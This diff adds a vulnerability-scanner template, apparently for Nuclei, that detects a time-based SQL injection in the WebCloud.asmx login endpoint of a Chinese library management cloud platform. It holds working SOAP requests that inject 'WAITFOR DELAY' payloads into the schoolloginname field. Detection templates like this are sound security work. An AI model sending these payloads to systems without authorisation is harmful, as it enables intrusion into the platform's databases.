@@ -1,0 +1,60 @@
+id: poc-yaml-cnedustar-webcloud-sqli
+info:
+  name: "科讯图书馆综合管理云平台WebCloud.asmx SQL注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 科讯图书馆综合管理云平台
+  description: |
+    This template detects SQL injection vulnerabilities in the WebCloud.asmx endpoint of the 科讯图书馆综合管理云平台.
+
+http:
+  - raw:
+      - |
+        POST /WebCloud.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "\"WebCloud/LibraryCloud\""
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <LibraryCloud xmlns="WebCloud">
+        <str>{"cmd":"login","schoolloginname":"1';WAITFOR DELAY '0:0:5'--","schoolpwd":"1"}</str>
+        <files>base64Binary</files>
+        </LibraryCloud>
+        </soap:Body>
+        </soap:Envelope>
+
+      - |
+        POST /WebCloud.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "\"WebCloud/LibraryCloud\""
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <LibraryCloud xmlns="WebCloud">
+        <str>{"cmd":"login","schoolloginname":"1';WAITFOR DELAY '0:0:8'--","schoolpwd":"1"}</str>
+        <files>base64Binary</files>
+        </LibraryCloud>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "<LibraryCloudResult>"
+          - "<LibraryCloudResponse>"
+          - "\"WebCloud\""
+
